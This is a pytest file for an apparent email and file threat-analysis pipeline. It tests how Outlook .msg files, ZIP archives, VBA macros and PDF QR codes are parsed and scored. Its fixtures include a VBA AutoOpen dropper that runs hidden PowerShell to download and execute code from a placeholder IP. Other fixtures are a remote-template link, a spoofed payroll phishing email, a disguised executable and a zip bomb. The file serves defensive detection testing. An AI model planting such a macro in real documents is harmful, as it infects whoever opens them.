"""
Outlook .msg, ZIP archives, Office VBA macros and QR codes inside PDFs: parsing and rules.
Every fixture is generated in-process (see ole_writer.py for the OLE container writer).
"""

import io
import zipfile

import pytest

from app.ingestion.ingested_input import IngestionSourceType
from app.ingestion.parsers import MAX_ARCHIVE_DEPTH, UnsupportedFileError, ingest_file
from app.ingestion.parsers.office_parser import decompress_vba
from app.pipeline.investigation import InvestigationPipeline
from tests.ole_writer import build_ole, vba_project
from tests.test_ingestion import build_qr_png

DROPPER = (
    'Attribute VB_Name = "Module1"\r\n'
    "Sub AutoOpen()\r\n"
    '    Set sh = CreateObject("WScript.Shell")\r\n'
    '    sh.Run "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\'http://203.0.113.9/a\')"\r\n'
    "End Sub\r\n"
)
BENIGN_MACRO = 'Attribute VB_Name = "Module1"\r\nSub FormatTable()\r\n    Selection.Font.Bold = True\r\nEnd Sub\r\n'


def rule_ids(result) -> set:
    return {f["rule_id"] for f in result.risk_assessment["findings"]}


async def investigate(filename: str, data: bytes):
    return await InvestigationPipeline().run(ingest_file(filename, data))


def build_docm(source: str = DROPPER, remote_template: bool = False) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/vbaProject.bin", build_ole({"PROJECT": b'ID="{0}"', "VBA": vba_project({"Module1": source})}))
        if remote_template:
            z.writestr("word/_rels/settings.xml.rels",
                       '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/'
                       '2006/relationships/attachedTemplate" Target="http://templates.evil-cdn.top/t.dotm" '
                       'TargetMode="External"/></Relationships>')
    return buf.getvalue()


def build_zip(members: dict, encrypt_names=()) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in members.items():
            z.writestr(name, data)
    data = bytearray(buf.getvalue())
    # zipfile can't write encrypted entries; set the "encrypted" flag bit in both headers instead
    for name in encrypt_names:
        encoded = name.encode()
        for sig, flag_offset, name_offset in ((b"PK\x03\x04", 6, 30), (b"PK\x01\x02", 8, 46)):
            pos = data.find(sig)
            while pos >= 0:
                if data[pos + name_offset:pos + name_offset + len(encoded)] == encoded:
                    data[pos + flag_offset] |= 0x01
                pos = data.find(sig, pos + 4)
    return bytes(data)


def build_msg(html: str, attachment=None, headers: str = "") -> bytes:
    def utf16(text: str) -> bytes:
        return text.encode("utf-16-le")

    tree = {
        "__properties_version1.0": b"\0" * 32,
        "__substg1.0_0037001F": utf16("Action required: payroll update"),
        "__substg1.0_1000001F": utf16("Please review the attached payroll change and confirm your password today."),
        "__substg1.0_10130102": html.encode("utf-8"),
        "__substg1.0_0C1A001F": utf16("Microsoft 365 Payroll"),
        "__substg1.0_0C1F001F": utf16("/O=EXCHANGELABS/OU=EXCHANGE ADMINISTRATIVE GROUP/CN=RECIPIENTS/CN=HR"),
        "__substg1.0_5D01001F": utf16("hr@payroll-notices.top"),
        "__recip_version1.0_#00000000": {"__substg1.0_39FE001F": utf16("victim@example.com")},
    }
    if headers:
        tree["__substg1.0_007D001F"] = utf16(headers)
    if attachment:
        name, data = attachment
        tree["__attach_version1.0_#00000000"] = {"__substg1.0_37010102": data, "__substg1.0_3707001F": utf16(name)}
    return build_ole(tree)


def build_pdf_with_qr(payload: str) -> bytes:
    fpdf = pytest.importorskip("fpdf")
    pdf = fpdf.FPDF()
    pdf.add_page()
    pdf.set_font("helvetica", size=12)
    pdf.cell(0, 10, "Parking fine - scan to pay")
    pdf.image(io.BytesIO(build_qr_png(payload)), x=20, y=30, w=80)
    return bytes(pdf.output())


# --- MS-OVBA decompression ---

def test_vba_decompression_matches_spec_example():
    # MS-OVBA 3.2.3 example: literals plus copy tokens
    compressed = bytes.fromhex("012FB00023616161626364658266007061676869" "6A01380861" "6B6C00306D6E6F7006710270041072737475761077787" "97A003C")
    assert decompress_vba(compressed) == b"#aaabcdefaaaaghijaaaaaklaaamnopqaaaaaaaaaaaarstuvwxyzaaa"
    with pytest.raises(ValueError):
        decompress_vba(b"\x02\x00")


# --- VBA macros ---

@pytest.mark.asyncio
async def test_docm_auto_exec_dropper_is_critical():
    ingested = ingest_file("invoice.docm", build_docm(remote_template=True))
    macros = ingested.metadata["analysis"]["macros"]
    assert macros[0]["autoexec"] == ["AutoOpen"]
    assert {"shell execution: WScript.Shell", "object creation: CreateObject"} <= set(macros[0]["suspicious"])
    assert "http://templates.evil-cdn.top/t.dotm" in ingested.content  # external template link reaches the IOC extractor

    result = await investigate("invoice.docm", build_docm())
    assert {"RULE_FIL_005", "RULE_FIL_006"} <= rule_ids(result)
    assert result.risk_assessment["severity"] == "CRITICAL"


@pytest.mark.asyncio
async def test_benign_macro_is_flagged_but_not_as_dropper():
    result = await investigate("report.xlsm", build_docm(BENIGN_MACRO))
    ids = rule_ids(result)
    assert "RULE_FIL_005" in ids and "RULE_FIL_006" not in ids


@pytest.mark.asyncio
async def test_legacy_ole_doc_macros_and_macro_free_docx():
    doc = build_ole({"WordDocument": b"\xec\xa5" + b"\0" * 64, "Macros": {"VBA": vba_project({"Module1": DROPPER})}})
    ingested = ingest_file("statement.doc", doc)
    assert ingested.source_type == IngestionSourceType.BROWSER_UPLOAD
    assert ingested.metadata["analysis"]["macros"][0]["file"] == "statement.doc"
    assert "RULE_FIL_006" in rule_ids(await investigate("statement.doc", doc))

    plain = build_zip({"[Content_Types].xml": "<Types/>", "word/document.xml": "<w:document/>"})
    clean = ingest_file("notes.docx", plain)
    assert "macros" not in clean.metadata["analysis"] and "archives" not in clean.metadata["analysis"]


# --- ZIP archives ---

@pytest.mark.asyncio
async def test_zip_members_are_extracted_and_inspected():
    inner = build_zip({"readme.txt": "Login at hxxps://secure-docs-share[.]top/view"})
    data = build_zip({"Invoice.pdf.exe": b"MZ\x90\x00payload", "inner.zip": inner, "report.xlsm": build_docm()})
    ingested = ingest_file("documents.zip", data)
    analysis = ingested.metadata["analysis"]
    outer, nested = analysis["archives"]
    assert outer["entries"] == 3 and outer["dangerous"] == ["Invoice.pdf.exe", "report.xlsm"] and outer["nested_archives"] == 1
    assert nested["path"] == "documents.zip/inner.zip" and nested["depth"] == 2
    assert "secure-docs-share[.]top" in ingested.content  # nested member text reaches the IOC extractor
    assert analysis["macros"][0]["file"] == "documents.zip/report.xlsm"
    assert len(ingested.metadata["seed_indicators"]["hashes"]) == 1 + 3 + 1  # archive, members, nested member

    ids = rule_ids(await investigate("documents.zip", data))
    assert {"RULE_FIL_007", "RULE_FIL_005", "RULE_FIL_006"} <= ids


@pytest.mark.asyncio
async def test_password_protected_entries_are_flagged_without_extraction():
    data = build_zip({"scan.js": "var x = 1;", "notes.txt": "hello"}, encrypt_names=["scan.js"])
    archive = ingest_file("protected.zip", data).metadata["analysis"]["archives"][0]
    assert archive["encrypted"] == ["scan.js"] and archive["dangerous"] == ["scan.js"]
    result = await investigate("protected.zip", data)
    finding = next(f for f in result.risk_assessment["findings"] if f["rule_id"] == "RULE_FIL_007")
    assert "password-protected" in finding["description"]


def test_archive_limits_depth_and_bombs():
    nested = build_zip({"payload.txt": "deep"})
    for i in range(MAX_ARCHIVE_DEPTH + 1):
        nested = build_zip({f"level{i}.zip": nested})
    archives = ingest_file("russian-doll.zip", nested).metadata["analysis"]["archives"]
    assert max(a["depth"] for a in archives) == MAX_ARCHIVE_DEPTH + 1
    assert any("nested deeper" in r for a in archives for r in a["limits_exceeded"])

    bomb = build_zip({"zeros.bin": b"\0" * (5 * 1024 * 1024)})
    archive = ingest_file("bomb.zip", bomb).metadata["analysis"]["archives"][0]
    assert any("decompression bomb" in r for r in archive["limits_exceeded"])


@pytest.mark.asyncio
async def test_benign_archive_does_not_trigger_archive_rule():
    data = build_zip({"minutes.txt": "Team meeting moved to Thursday.", "budget.csv": "q1,100\nq2,120"})
    assert "RULE_FIL_007" not in rule_ids(await investigate("meeting.zip", data))


# --- Outlook .msg ---

@pytest.mark.asyncio
async def test_msg_parses_like_eml_and_inspects_attachments():
    html = ('<p>Review your payroll change: <a href="https://payroll-verify.top/login">'
            'https://portal.office.com/payroll</a></p>')
    headers = ("Received: from mail.payroll-notices.top (unknown [185.220.101.47]) by mx.example.com\r\n"
               "Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=payroll-notices.top; dmarc=fail\r\n"
               "Reply-To: collect@other-domain.ru\r\n\r\n")
    data = build_msg(html, attachment=("payroll.docm", build_docm()), headers=headers)
    ingested = ingest_file("Payroll update.msg", data)
    email = ingested.metadata["analysis"]["email"]
    assert ingested.source_type == IngestionSourceType.EMAIL
    assert email["format"] == "msg" and email["from"] == "hr@payroll-notices.top"  # SMTP, not the Exchange DN
    assert email["to"] == ["victim@example.com"] and email["authentication"]["spf"] == "fail"
    assert email["received_ips"] == ["185.220.101.47"] and email["reply_to_domain"] == "other-domain.ru"
    assert email["attachments"][0]["filename"] == "payroll.docm" and "_data" not in email["attachments"][0]
    assert "https://payroll-verify.top/login" in ingested.content

    ids = rule_ids(await investigate("Payroll update.msg", data))
    # Existing email rules apply to .msg, plus the new deceptive-link and macro rules
    assert {"RULE_EML_001", "RULE_EML_002", "RULE_EML_003", "RULE_EML_004", "RULE_FIL_001", "RULE_FIL_006"} <= ids


def test_msg_without_internet_headers_and_invalid_msg():
    ingested = ingest_file("draft.msg", build_msg("<p>Hello</p>"))
    email = ingested.metadata["analysis"]["email"]
    assert email["has_internet_headers"] is False and email["subject"] == "Action required: payroll update"
    with pytest.raises(UnsupportedFileError):
        ingest_file("broken.msg", b"definitely not an OLE file")


# --- Deceptive link text (.eml and .msg) ---

def test_deceptive_link_text_ignores_matching_and_rewritten_links():
    from app.risk_engine.content_rules import DeceptiveLinkTextRule
    rule = DeceptiveLinkTextRule()

    def matched(pairs):
        return rule.evaluate({"ingestion": {"email": {"link_texts": pairs}}})[0]

    assert matched([{"text": "www.paypal.com", "href": "https://paypal.account-check.top/x"}])
    assert not matched([{"text": "www.paypal.com", "href": "https://www.paypal.com/signin"}])
    assert not matched([{"text": "https://example.org/report", "href": "https://nam02.safelinks.protection.outlook.com/?url=x"}])


# --- QR codes in PDF images ---

@pytest.mark.asyncio
async def test_qr_code_in_pdf_image_is_decoded():
    pytest.importorskip("cv2")
    data = build_pdf_with_qr("https://pay-parking-fine.top/ticket")
    ingested = ingest_file("fine.pdf", data)
    images = ingested.metadata["analysis"]["file"]["pdf"]["images"]
    assert images["scanned"] >= 1 and images["qr_payloads"] == ["https://pay-parking-fine.top/ticket"]
    assert "pay-parking-fine.top" in ingested.content
    assert "RULE_FIL_008" in rule_ids(await investigate("fine.pdf", data))
